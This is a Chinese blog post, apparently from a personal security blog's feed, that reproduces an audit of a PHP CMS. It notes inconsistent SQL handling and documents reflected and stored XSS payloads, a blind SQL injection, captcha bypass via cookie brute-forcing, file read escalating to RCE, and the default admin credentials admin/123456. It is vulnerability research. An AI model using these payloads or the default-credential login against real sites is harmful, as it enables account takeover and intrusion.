    <content type="html"><![CDATA[<p>看微信公众号有个审计这个CMS的文章。跟着复现了一下，大体来说这个CMS还是比较安全的<br>but，部分功能写法完全不统一。写sql查询的时候有些用了PDO，有些直接带入查询</p><h2 id="预处理分析"><a href="#预处理分析" class="headerlink" title="预处理分析"></a>预处理分析</h2><p>除了编辑器以外的php都会引用system/inc.php或者system/library.php</p><ul><li>library.php 处理函数和单双引号转义处理</li><li>inc.php 引用了system目录里的所有文件</li></ul><h2 id="大概分析"><a href="#大概分析" class="headerlink" title="大概分析"></a>大概分析</h2><p>首先是install/index2.php。写入数据库和生成install.lock文件的处理<br><img src="https://z3.ax1x.com/2021/03/31/cFIVqP.png" alt=""></p><p>首先加载了/system/library.php<br><img src="https://z3.ax1x.com/2021/03/31/cFIlxs.png" alt=""></p><p>可以看到，对所有的请求对单双引号进行了转义</p><pre><code class="php">if (!defined(&#39;PCFINAL&#39;)) {    exit(&#39;Request Error!&#39;);}if (!get_magic_quotes_gpc()) {    if (!empty($_GET)) {        $_GET = addslashes_deep($_GET);    }    if (!empty($_POST)) {        $_POST = addslashes_deep($_POST);    }    $_COOKIE = addslashes_deep($_COOKIE);    $_REQUEST = addslashes_deep($_REQUEST);}</code></pre><p>之后index2.php的流程<br>1.判断了install.lock文件是否存在<br>2.将数据库配置信息写入到system/data.php<br>3.往数据库导入sql</p><p>由于过滤了特殊符号，这里单引号没法闭合。无法利用<br>安装完默认后台:admin/123456</p><h3 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h3><p>template\wapian\movie.php<br><img src="https://z3.ax1x.com/2021/03/31/cFI0z9.png" alt=""></p><p>getPageHtml函数是用来模板渲染的<br><img src="https://z3.ax1x.com/2021/03/31/cFIDMR.png" alt=""></p><p>看了一下payload主要还是<code>$yourneed</code>参数，跟踪发现来自360.php<br><img src="https://z3.ax1x.com/2021/03/31/cFIgIO.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/03/31/cFIcdK.png" alt=""></p><p>无任何过滤<br>payload:<code>m=&quot;11111111111&quot;&gt;&lt;script&gt;prompt(/xss/)&lt;/script&gt;&lt;</code><br><img src="https://z3.ax1x.com/2021/03/31/cFIRiD.png" alt=""></p><p>貌似payload并不会因为addslashes_deep函数而失效</p><p>个人信息修改处，无任何过滤造成存储型xss<br><img src="https://z3.ax1x.com/2021/03/31/cFoKw6.png" alt=""></p><p>payload:”<code>&gt;&lt;script&gt;prompt(/xss/)&lt;/script&gt;&lt;&quot;</code><br><img src="https://z3.ax1x.com/2021/03/31/cFoGSH.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/03/31/cFoJld.png" alt=""></p><p>申请友链的存储xss<br><img src="https://z3.ax1x.com/2021/03/31/cFoop4.png" alt=""></p><p>后台处理<br><img src="https://z3.ax1x.com/2021/03/31/cFoO76.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/03/31/cFojAK.png" alt=""></p><p>留言板和这个差不多一致，省略</p><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>虽然使用了addslashes_deep函数。导致登录处和代单/双引号的sql无法闭合，数据库也不是GBK<br>but还是有一处盲注<br><img src="https://z3.ax1x.com/2021/03/31/cFTS9e.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/03/31/cFT9cd.png" alt=""></p><h3 id="cookie爆破后台绕过验证码"><a href="#cookie爆破后台绕过验证码" class="headerlink" title="cookie爆破后台绕过验证码"></a>cookie爆破后台绕过验证码</h3><p><img src="https://z3.ax1x.com/2021/03/31/cFTZ4S.png" alt=""></p><p><img src="https://z3.ax1x.com/2021/03/31/cFTkHP.png" alt=""></p><h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p>在开启了 allow_url_fopen和allow_url_include开启后会变成RCE<br><img src="https://z3.ax1x.com/2021/03/31/cFTm9g.png" alt=""></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这套CMS靠着一些奇怪的方法来导致原本可利用的漏洞无法利用，例如后台功能大部分可以越权利用。但是另外的函数找不到，导致利用失败<br><img src="https://z3.ax1x.com/2021/03/31/cFTwuR.png" alt=""></p><p>总的来说，这套CMS有点水</p><p>参考链接:<a href="https://mp.weixin.qq.com/s?__biz=MzU0MDg5MzIzMQ==&amp;mid=2247485517&amp;idx=1&amp;sn=24b6f24b506ecaa64ec2897e8302ee7b" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzU0MDg5MzIzMQ==&amp;mid=2247485517&amp;idx=1&amp;sn=24b6f24b506ecaa64ec2897e8302ee7b</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;看微信公众号有个审计这个CMS的文章。跟着复现了一下，大体来说这个CMS还是比较安全的&lt;br&gt;but，部分功能写法完全不统一。写sql查询的时候有些用了PDO，有些直接带入查询&lt;/p&gt;
&lt;h2 id=&quot;预处理分析&quot;&gt;&lt;a href=&quot;#预处理分析&quot; class=&quot;heade</summary>
      
    
    
    
    
    <category term="代码审计" scheme="http://422926799.github.io/tags/代码审计/"/>
    
  </entry>
  
</feed>
